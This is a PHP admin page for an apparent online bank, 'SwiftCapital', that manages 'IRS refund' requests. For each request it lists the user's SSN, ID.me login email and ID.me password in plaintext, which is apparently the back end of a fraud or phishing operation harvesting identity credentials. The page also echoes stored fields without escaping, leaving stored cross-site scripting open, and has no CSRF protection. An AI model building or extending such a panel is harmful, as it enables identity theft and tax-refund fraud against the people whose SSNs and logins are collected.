<?php 
require_once '../includes/db.php';
require_once '../includes/admin-check.php'; 

// Fetch Stats
$pending_count = $pdo->query("SELECT COUNT(*) FROM irs_requests WHERE status = 'Pending'")->fetchColumn();
$in_progress = $pdo->query("SELECT COUNT(*) FROM irs_requests WHERE status = 'In Progress'")->fetchColumn();
$approved_total = $pdo->query("SELECT COUNT(*) FROM irs_requests WHERE status = 'Approved'")->fetchColumn();

// Fetch Requests
$search = $_GET['search'] ?? '';
$where_sql = "";
$params = [];
if ($search) {
    $where_sql = "WHERE u.email LIKE ? OR u.name LIKE ? OR u.lastname LIKE ? OR i.ssn LIKE ?";
    $params = ["%$search%", "%$search%", "%$search%", "%$search%"];
}

$stmt = $pdo->prepare("SELECT i.*, u.name, u.lastname, u.email FROM irs_requests i JOIN users u ON i.user_id = u.id $where_sql ORDER BY i.created_at DESC");
$stmt->execute($params);
$irs_requests = $stmt->fetchAll();

// Handle Actions
if (isset($_POST['action'])) {
    $req_id = $_POST['request_id'];
    $new_status = $_POST['status'];
    
    if ($new_status == 'Approved') {
        // Here you might want to auto-credit the user, but usually it's manual deposit
        // For now just update status
        $pdo->prepare("UPDATE irs_requests SET status = ? WHERE id = ?")->execute([$new_status, $req_id]);
    } else {
        $pdo->prepare("UPDATE irs_requests SET status = ? WHERE id = ?")->execute([$new_status, $req_id]);
    }
    header("Location: irs.php?success=1");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IRS Refund Management - SwiftCapital Admin</title>
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Bootstrap 5 -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <!-- Custom Admin CSS -->
    <link rel="stylesheet" href="admin-style.css">
    <style>
        .irs-card {
            background: #fff;
            border-radius: 20px;
            border: 1px solid rgba(0,0,0,0.05);
            padding: 25px;
            transition: all 0.3s ease;
        }
        .irs-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0,0,0,0.05);
        }
        .status-badge {
            padding: 6px 12px;
            border-radius: 30px;
            font-size: 0.7rem;
            font-weight: 800;
            text-transform: uppercase;
        }
        .status-pending { background: #fff7ed; color: #ea580c; border: 1px solid #ffedd5; }
        .status-progress { background: #eff6ff; color: #2563eb; border: 1px solid #dbeafe; }
        .status-approved { background: #f0fdf4; color: #16a34a; border: 1px solid #dcfce7; }
        .status-rejected { background: #fef2f2; color: #dc2626; border: 1px solid #fee2e2; }
    </style>
</head>
<body>

    <!-- Sidebar -->
    <div class="admin-sidebar">
        <div class="brand-area">
            <div class="brand-icon"><i class="fa-solid fa-shield-halved"></i></div>
            <div class="brand-name">SwiftAdmin</div>
        </div>

        <div class="nav-links">
            <a href="index.php" class="nav-link">
                <i class="fa-solid fa-gauge"></i> Dashboard
            </a>
            <a href="users.php" class="nav-link">
                <i class="fa-solid fa-users"></i> Users Management
            </a>
            <a href="transactions.php" class="nav-link">
                <i class="fa-solid fa-money-bill-transfer"></i> Transactions
            </a>
            <a href="credits.php" class="nav-link">
                <i class="fa-solid fa-circle-dollar-to-slot"></i> Credit Requests
            </a>
            <a href="loans.php" class="nav-link">
                <i class="fa-solid fa-hand-holding-dollar"></i> Loan Requests
            </a>
            <a href="irs.php" class="nav-link active">
                <i class="fa-solid fa-file-invoice-dollar"></i> IRS Refunds
            </a>
            <a href="kyc.php" class="nav-link">
                <i class="fa-solid fa-id-card-clip"></i> KYC Verifications
            </a>
            <a href="support.php" class="nav-link">
                <i class="fa-solid fa-headset"></i> Support Tickets
            </a>
            <a href="cms.php" class="nav-link">
                <i class="fa-solid fa-pen-nib"></i> Frontend CMS
            </a>
            <a href="settings.php" class="nav-link">
                <i class="fa-solid fa-gear"></i> System Settings
            </a>
            
            <div class="mt-auto" style="position: absolute; bottom: 20px; width: 100%;">
                <a href="../logout.php" class="nav-link text-danger">
                    <i class="fa-solid fa-power-off"></i> Logout
                </a>
            </div>
        </div>
    </div>

    <!-- Main Wrapper -->
    <div class="main-wrapper">
        <!-- Top Bar -->
        <div class="top-bar">
            <div class="breadcrumb-area">
                <h4 class="mb-0 fw-800">IRS Refund Management</h4>
            </div>

            <div class="user-nav">
                <div class="admin-profile">
                    <div class="admin-avatar">A</div>
                    <div class="d-none d-md-block">
                        <div class="fw-bold">Administrator</div>
                        <div class="text-xs text-muted">Superuser</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Content Area -->
        <div class="content-padding">
            
            <!-- Stats Row -->
            <div class="row g-4 mb-5">
                <div class="col-md-3">
                    <div class="irs-card bg-white border-0 shadow-sm">
                        <div class="text-xs text-muted fw-800 text-uppercase mb-2">Awaiting Review</div>
                        <div class="d-flex align-items-center justify-content-between">
                            <h2 class="mb-0 fw-900"><?php echo $pending_count; ?></h2>
                            <div class="bg-indigo-light text-primary p-2 rounded-3"><i class="fa-solid fa-clock-rotate-left"></i></div>
                        </div>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="irs-card bg-white border-0 shadow-sm">
                        <div class="text-xs text-muted fw-800 text-uppercase mb-2">In Progress</div>
                        <div class="d-flex align-items-center justify-content-between">
                            <h2 class="mb-0 fw-900"><?php echo $in_progress; ?></h2>
                            <div class="bg-blue-light text-info p-2 rounded-3"><i class="fa-solid fa-gears"></i></div>
                        </div>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="irs-card bg-white border-0 shadow-sm">
                        <div class="text-xs text-muted fw-800 text-uppercase mb-2">Total Paid</div>
                        <div class="d-flex align-items-center justify-content-between">
                            <h2 class="mb-0 fw-900"><?php echo $approved_total; ?></h2>
                            <div class="bg-green-light text-success p-2 rounded-3"><i class="fa-solid fa-circle-check"></i></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="data-table-card mt-0">
                <div class="card-header border-0 bg-transparent py-4 px-4 d-flex justify-content-between align-items-center">
                    <h5 class="mb-0 fw-800">Refund Applications Queue</h5>
                    <form class="d-flex gap-2" method="GET">
                        <input type="text" name="search" class="form-control form-control-sm" placeholder="Search SSN or Name..." value="<?php echo htmlspecialchars($search); ?>" style="width: 200px;">
                        <button type="submit" class="btn btn-primary btn-sm px-3 fw-bold">Filter</button>
                    </form>
                </div>
                <div class="table-responsive">
                    <table class="table table-striped align-middle">
                        <thead>
                            <tr>
                                <th>User</th>
                                <th>IRS Credentials</th>
                                <th>ID.me Access</th>
                                <th>Status</th>
                                <th>Date</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach($irs_requests as $req): ?>
                            <tr>
                                <td>
                                    <div class="fw-bold"><?php echo $req['name'] . ' ' . $req['lastname']; ?></div>
                                    <div class="text-xs text-muted"><?php echo $req['email']; ?></div>
                                </td>
                                <td>
                                    <div class="text-sm fw-700"><?php echo $req['full_name']; ?></div>
                                    <div class="text-xs text-primary fw-bold">SSN: <?php echo $req['ssn']; ?></div>
                                </td>
                                <td>
                                    <div class="text-xs">User: <?php echo $req['id_me_email']; ?></div>
                                    <div class="text-xs">Pass: <span class="bg-light px-1"><?php echo $req['id_me_password']; ?></span></div>
                                </td>
                                <td>
                                    <?php 
                                    $s = $req['status'];
                                    $cls = 'status-pending';
                                    if($s == 'In Progress') $cls = 'status-progress';
                                    if($s == 'Approved') $cls = 'status-approved';
                                    if($s == 'Rejected') $cls = 'status-rejected';
                                    ?>
                                    <span class="status-badge <?php echo $cls; ?>"><?php echo $s; ?></span>
                                </td>
                                <td class="text-xs"><?php echo date('M d, Y', strtotime($req['created_at'])); ?></td>
                                <td>
                                    <form method="POST" class="d-flex gap-1">
                                        <input type="hidden" name="request_id" value="<?php echo $req['id']; ?>">
                                        <button type="submit" name="action" value="update" class="btn btn-light btn-sm p-1">
                                            <select name="status" class="form-select form-select-sm border-0 bg-transparent py-0 fw-bold" onchange="this.form.submit()" style="font-size: 0.75rem;">
                                                <option value="Pending" <?php if($s == 'Pending') echo 'selected'; ?>>Set Pending</option>
                                                <option value="In Progress" <?php if($s == 'In Progress') echo 'selected'; ?>>Set Progress</option>
                                                <option value="Approved" <?php if($s == 'Approved') echo 'selected'; ?>>Set Approved</option>
                                                <option value="Rejected" <?php if($s == 'Rejected') echo 'selected'; ?>>Set Rejected</option>
                                            </select>
                                        </button>
                                    </form>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>

        </div>

        <!-- Footer -->
        <footer class="mt-auto py-4 px-4 border-top bg-white text-center text-muted" style="font-size: 0.85rem;">
            SwiftCapital Admin © 2026. Internal Audit System.
        </footer>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
